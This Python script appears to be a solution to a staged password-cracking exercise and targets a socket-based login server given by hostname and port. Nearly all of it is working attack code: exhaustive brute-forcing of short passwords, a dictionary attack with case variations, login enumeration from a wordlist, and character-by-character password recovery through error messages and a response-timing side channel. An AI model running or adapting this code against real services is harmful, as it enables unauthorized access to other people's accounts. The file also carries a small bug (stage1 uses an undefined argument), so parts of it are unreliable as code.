import string
import socket
import argparse
import itertools
import json
from time import time

parser = argparse.ArgumentParser()
parser.add_argument("hostname", type=str, help="e.g. 177.23.45.111")
parser.add_argument("port", type=int, help="e.g. 8080")
args = parser.parse_args()


def password_generator():
    with open("../../passwords.txt", "r") as f:
        for pwd in f:
            variations = [(c.lower(), c.upper()) if c.isalpha() else c for c in pwd.strip()]
            for chars in itertools.product(*variations):
                yield "".join(chars)


def login_generator():
    with open("../../logins.txt", "r") as f:
        for login in f:
            yield login.strip()


def stage1():
    with socket.socket() as client:
        client.connect((args.hostname, args.port))
        client.send(args.msg.encode())
        response = client.recv(1024)
        response = response.decode()
        print(response)


def stage2():
    allowed_chars = string.ascii_lowercase + string.digits
    combinations = [allowed_chars]
    i = 1
    searching = True
    with socket.socket() as client:
        client.connect((args.hostname, args.port))
        while searching:
            for a in itertools.product(*combinations):
                i += 1
                password = "".join(a)
                data = password.encode()
                client.send(data)
                response = client.recv(1024)
                response = response.decode()
                if response == "Too many attempts" or i > 1000000:
                    searching = False
                    break
                elif response == "Connection success!":
                    print(password)
                    searching = False
                    break
            combinations.append(allowed_chars)


def stage3():
    passwords = password_generator()
    with socket.socket() as client:
        client.connect((args.hostname, args.port))
        for pwd in passwords:
            client.send(pwd.encode())
            response = client.recv(1024)
            response = response.decode()
            if response == "Connection success!":
                print(pwd)
                break


def stage4():
    allowed_chars = "".join([string.ascii_letters, string.digits])
    logins = login_generator()
    pwd_guess = []
    payload = {"login": "", "password": ""}
    searching = True
    with socket.socket() as client:
        client.connect((args.hostname, args.port))
        for login in logins:
            payload["login"] = login
            client.send(json.dumps(payload).encode())
            response = json.loads(client.recv(1024).decode())
            if response["result"] == "Wrong password!":
                break
        while searching:
            for char in allowed_chars:
                pwd_guess.append(char)
                payload["password"] = ''.join(pwd_guess)
                client.send(json.dumps(payload).encode())
                response = json.loads(client.recv(1024).decode())
                if response["result"] == "Wrong password!":
                    pwd_guess.pop()
                elif response["result"] == "Exception happened during login":
                    continue
                elif response["result"] == "Connection success!":
                    searching = False
                    print(json.dumps(payload))
                    break


def stage5():
    allowed_chars = "".join([string.ascii_letters, string.digits])
    logins = login_generator()
    pwd_chars = []
    payload = {"login": "", "password": ""}
    searching = True
    with socket.socket() as client:
        client.connect((args.hostname, args.port))
        for login in logins:
            payload["login"] = login
            client.send(json.dumps(payload).encode())
            response = json.loads(client.recv(1024).decode())
            if response["result"] == "Wrong password!":
                break
        while searching:
            for char in allowed_chars:
                pwd_chars.append(char)
                payload["password"] = ''.join(pwd_chars)
                time_start = time()
                client.send(json.dumps(payload).encode())
                response = json.loads(client.recv(1024).decode())
                time_end = time()
                if time_end - time_start > 0.05:
                    continue
                elif response["result"] == "Connection success!":
                    searching = False
                    print(json.dumps(payload))
                    break
                else:
                    pwd_chars.pop()


def main():
    stage5()


if __name__ == "__main__":
    main()
